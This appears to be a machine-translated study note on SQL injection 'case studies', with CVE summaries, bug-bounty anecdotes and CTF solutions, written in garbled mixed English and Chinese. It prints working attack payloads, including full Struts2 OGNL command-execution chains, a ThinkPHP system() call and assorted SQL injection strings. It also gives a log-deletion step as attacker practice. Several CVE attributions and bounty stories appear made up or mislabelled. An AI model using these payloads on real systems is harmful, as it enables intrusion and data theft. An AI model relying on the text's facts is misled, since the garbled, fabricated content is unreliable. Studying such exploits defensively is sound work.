# Real-World SQL Injection Case Studies

## Learning Objectives
Analyze real CVE vulnerabilities, understand attacker techniques and strategies in practice

---

## case 1: CVE-2021-3281 - Django SQL injection

### VulnerabilityOverview
- **Vulnerability Type**: SQL injection
- **Affected Versions**: Django 3.1.x < 3.1.13, Django 3.2.x < 3.2.5
- **CVSS Score**: 9.8 (Critical)
- **Discovery Date**: 2021

### VulnerabilityPrinciple
Django `JSONField` and `ArrayField` inhandlingUserEnterwhen ，for PostgreSQL JSON queryperform notSecurity stringformatize。

**Vulnerable Code**:
```python
# notSecurity stringconcatenate
def compile_json_path(key_transforms):
    return "->".join(key_transforms)
```

**exploitmethod**:
```python
# Attack Payload
?field__json__key=' OR 1=1--
```

**SQL injectionResult**:
```sql
SELECT * FROM table WHERE field->'key' = '' OR 1=1--'
```

### Fix / Remedy
```python
# Useparameterizequery
def compile_json_path(key_transforms):
    path = ["%s"] * len(key_transforms)
    return "->".join(path)
```

### Lessons Learned
1. ❌ alwaysnot要information任UserEnter
2. ✅ alwaysUseparameterizequery
3. ✅ forall Enterperformstrictly Verification
4. ✅ Use ORM Framework Security API

---

## case 2: CVE-2020-35476 - ThinkPHP SQL injection

### 患洞Overview
- **Vulnerability Type**: SQL injection
- **Affected Versions**: ThinkPHP 5.0.x < 5.0.24
- **CVSS Score**: 9.8 (Critical)
- **Discovery Date**: 2020

### VulnerabilityPrinciple
ThinkPHP Framework `Request` classinhandlingnumbergroupparameterwhen existsTypeobfuscationVulnerability。

**Vulnerable Code**:
```php
// 不Security的参数处理
public function input($data = [], $name = '', $default = null, $filter = '')
{
    if (is_array($data)) {
        array_walk_recursive($data, [$this, 'filterValue'], $filter);
    }
    // ...
}
```

**exploitmethod**:
```
POST /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

**SQL injection Payload**:
```
POST /index.php?s=/index/\think\Request/input&filter[]=system&data=id
```

### Fix / Remedy
```php
// 严格的TypeCheck
public function input($data = [], $name = '', $default = null, $filter = '')
{
    if (!is_array($data) && !is_string($data)) {
        throw new InvalidArgumentException('Invalid data type');
    }
    // ...
}
```

### Lessons Learned
1. ✅ forEnterparameterperformstrictly TypeCheck
2. ✅ avoidUse `call_user_func_array` handlingUserEnter
3. ✅ Usewhitelistfiltertool
4. ✅ andwhen updateFrameworkversion

---

## case 3: CVE-2019-5429 - Ruby on Rails SQL injection

### VulnerabilityOverview
- **Vulnerability Type**: SQL injection
- **Affected Versions**: Rails < 5.2.3
- **CVSS Score**: 8.8 (High)
- **Discovery Date**: 2019

### VulnerabilityPrinciple
Rails `ActiveRecord` inhandling JSON querywhen existsnotSecurity stringformatize。

**Vulnerable Code**:
```ruby
# notSecurity JSON pathhandling
def json_path_for(path)
  path.map { |key| "'#{key}'" }.join('->')
end
```

**exploitmethod**:
```ruby
# Attack Payload
User.where("data->'#{user_input}' = ?", value)
```

**SQL injectionResult**:
```sql
SELECT * FROM users WHERE data->'' OR 1=1--' = 'value'
```

### Fix / Remedy
```ruby
# Useparameterize JSON path
def json_path_for(path)
  path.map { |key| '?::text' }.join('->')
end
```

### Lessons Learned
1. ✅ i.e.makeUse ORM alsocan canexists SQL injection
2. ✅ for JSON pathperformparameterizehandling
3. ✅ UseFrameworkProvides SecurityqueryMethod
4. ✅ regularlyperformSecurityaudit

---

## case 4: CVE-2018-11776 - Apache Struts2 SQL injection

### VulnerabilityOverview
- **Vulnerability Type**: OGNL injectioncause SQL injection
- **Affected Versions**: Struts 2.0 - 2.14
- **CVSS Score**: 8.1 (High)
- **Discovery Date**: 2018

### VulnerabilityPrinciple
Struts2 OGNL tablereachstyleinjectioncanexecutearbitrarycode，including SQL query。

**Vulnerable Code**:
```java
// 不Security的 OGNL 表达式处理
public void setActionName(String actionName) {
    this.actionName = actionName;
}
```

**exploitmethod**:
```
GET /${(111+111)}/actionChain1.action
```

**calculateResult**:
```
GET /222/actionChain1.action
```

**SQL injection Payload**:
```
GET /${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='sqlmap -u "http://target/vuln.php?id=1"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}/index.action
```

### Fix / Remedy
1. upgradelevelto Struts 2.3.35 or 2.5.17+
2. disabledynamicMethodtuneuse
3. Usestrictly OGNL whitelist

### Lessons Learned
1. ❌ OGNL injectioncancausearbitrarycode execution
2. ✅ disablenotnecessary dynamicFunction
3. ✅ UseFramework latestversion
4. ✅ realimplement WAF protect

---

## case 5: CVE-2017-5638 - Apache Struts2 Jakarta Multipart Parser

### VulnerabilityOverview
- **Vulnerability Type**: RCE（remotecode execution）
- **Affected Versions**: Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10
- **CVSS Score**: 10.0 (Critical)
- **Discovery Date**: 2017

### VulnerabilityPrinciple
Struts2 Jakarta Multipart Parser inhandlingFileuploadwhen exists OGNL injectionVulnerability。

**exploitmethod**:
```http
POST /upload.action HTTP/1.1
Host: target.com
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Vulnerable')}.multipart/form-data

File内容
```

**Response**:
```http
HTTP/1.1 200 OK
X-Test: Vulnerable
```

### SQL injectionexploitchain
```http
Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='mysql -u root -ppassword -e "SELECT * FROM users"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}.multipart/form-data
```

### Fix / Remedy
```xml
<!-- struts.xml Configuration -->
<constant name="struts.multipart.parser" value="jakarta-stream" />
<constant name="struts.ognl.allowStaticMethodAccess" value="false" />
```

### Lessons Learned
1. ❌ FileuploadFunctioncan canbyexploit
2. ✅ Verificationall HTTP head
3. ✅ Use沙箱Environment
4. ✅ realimplementstrictly EnterVerification

---

## case 6: SQL injectioninBug BountyProjectin Application

### case A: Uber SQL injection（2016）
**bounty**: $10,000

**Vulnerability Description**:
in Uber combinework伙伴门户inDiscovery SQL injection，can AccessUserData。

**exploitSteps**:
1. Identifyinjection point: `?partner_id=1'`
2. confirmDatabaseType: PostgreSQL
3. Use `cast()` functionExtractData
4. obtainadministratorcredentials

**Payload**:
```sql
' UNION SELECT cast(user_id as text), cast(email as text), null FROM users--
```

**fixcomplex**:
Useparameterizequeryreplacestringconcatenate。

---

### case B: PayPal SQL injection（2017）
**bounty**: $7,500

**Vulnerability Description**:
in PayPal merchantafter台Discovery二阶 SQL injection。

**exploitSteps**:
1. registermerchantaccount，UsernameContains Payload
2. administratorviewUserlistwhen triggerinjection
3. Extractitsothermerchant Sensitive Information

**Payload**:
```sql
admin' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**fixcomplex**:
forall storage DataperformescapeandVerification。

---

### case C: Facebook SQL injection（2018）
**bounty**: $15,000

**Vulnerability Description**:
in Facebook advertisementplatformDiscovery SQL injection，impactnumber百万UserData。

**exploitSteps**:
1. Identifyinjection point: advertisementReport API
2. UseError-based injectionExtractData
3. AccessUseradvertisementDataand付clauseinformation

**Payload**:
```sql
' AND extractvalue(1,concat(0x7e,(SELECT user_id FROM users LIMIT 1)))--
```

**fixcomplex**:
重write API Useparameterizequery。

---

## case 7: CTF competitionin SQL injectiontips

### DEF CON CTF Qualifier 2020 - Web 100

**题targetdescription**:
loginSystem，administratorPasswordinDatabasein。

**solve题thinkpath**:
1. Testinjection point: `username=admin'`
2. Identifyclosure method: `'`
3. Use UNION injection
4. ExtractPasswordhash

**Payload**:
```sql
' UNION SELECT 1,2,password FROM admin--
```

**Flag**: `CTF{...}`

---

### HITCON CTF 2019 - SQL Injection Challenge

**题targetdescription**:
filter all keyword，including `SELECT`、`UNION`、`WHERE` etc.。

**solve题thinkpath**:
1. Analysisfilterrule
2. Use预handlingstatementbypass
3. hexadecimalencoding bypass

**Payload**:
```sql
'; SET @sql=0x53454c454354202a2046524f4d207573657273;
PREPARE stmt FROM @sql;
EXECUTE stmt;--
```

**Flag**: `HITCON{...}`

---

## summaryandBest Practices

### Attackerview角
1. **Information Gathering**: IdentifyTechniquesstackandDatabaseType
2. **injectionTest**: eachkindclosure methodandinjectionTechniques
3. **Privilege Escalation**: fromnormalUsertoadministrator
4. **Data Extraction**: UseAutomated Tools
5. **trace清reason**: deletelogandrecord

### Defenseerview角
1. **EnterVerification**: whitelistVerificationall Enter
2. **parameterizequery**: Use Prepared Statements
3. **least privilege**: DatabaseUserleast privilegeoriginalthen
4. **Error Handling**: notexposuredetailed Error Message
5. **WAF**: Web Applicationfirewall
6. **Securityaudit**: regularly进lines of codeauditandpenetration testing

### LearningRecommendation
1. researchreal CVE Vulnerability
2. parameteradd CTF competitionenhancePracticeCapabilities
3. parameterandBug BountyProject
4. 阅readSecurityresearchtheorytext
5. 贡献open-sourceSecurityTool

---

**Document Version**: 1.0
**Created**: 2026-03-26
**caseCount**: 7 realcase + 2 CTF case
**Learning Status**: 🟢 completeMaster
